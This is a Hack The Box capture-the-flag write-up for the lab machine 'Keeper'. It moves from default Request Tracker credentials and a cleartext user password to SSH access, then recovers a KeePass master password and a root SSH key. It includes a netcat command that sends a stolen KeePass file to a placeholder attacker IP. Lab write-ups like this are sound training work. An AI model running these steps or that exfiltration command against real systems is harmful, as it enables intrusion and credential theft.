# HTB - Keeper

**IP Address:** `10.10.11.35`  
**OS:** Ubuntu Jammy (22.04)  
**Difficulty:** Easy  
**Tags:** #WebApp, #Docker, #RequestTracker, #SSH, #KeePass, #PuTTYKeyConversion

---

## 1. Initial Enumeration

### 1.1 Nmap Scan

Open Ports:

- `22/tcp` → SSH (OpenSSH 8.9p1 Ubuntu)
- `80/tcp` → HTTP (nginx 1.18.0)

---

## 2. Web Enumeration

Accessed `http://10.10.11.35`.  
Received redirect-like behavior.  

Added the hostname from the redirect manually into `/etc/hosts` to access the application.

Discovered a **Request Tracker** system.  
Searched GitHub and found default Docker environment variables in its Dockerfile:

```bash
ENV RT_DBA_USER root
ENV RT_DBA_PASSWORD password
```

✅ Used `root:password` to log in.

---

## 3. Credential Discovery

Navigated to **Admin → Users → lnorgaard**.  
Discovered cleartext password: `Welcome2023!`

---

## 4. SSH Access

Used `lnorgaard:Welcome2023!` to log in via SSH:

```bash
ssh lnorgaard@10.10.11.35
```

🏁 **User flag obtained**

---

## 5. KeePass File Transfer

Found `.kdbx` (KeePass) file on the system.  

Compressed it:

```bash
zip comprimido.zip <filename>
```

Transferred it using Netcat:

```bash
# Victim
nc <attacker_ip> 443 < comprimido.zip

# Attacker
nc -lvnp 443 > comprimido.zip
```

Verified transfer via `md5sum`.

---

## 6. KeePass File Cracking

### 6.1 Tried Wordlists → ❌ Failed

### 6.2 Used GitHub tool:

```bash
https://github.com/matro7sh/keepass-dump-masterkey
```

Extracted several candidate passwords.  
One was `rødgrød med fløde` (Danish phrase).

✅ Correct KeePass master password.

---

## 7. Found Root SSH Key

Inside KeePass entry for `root` user:

- PuTTY format private key

Converted key to PEM format:

```bash
puttygen key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
```

---

## 8. SSH as Root

```bash
ssh -i id_rsa root@10.10.11.35
```

🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE
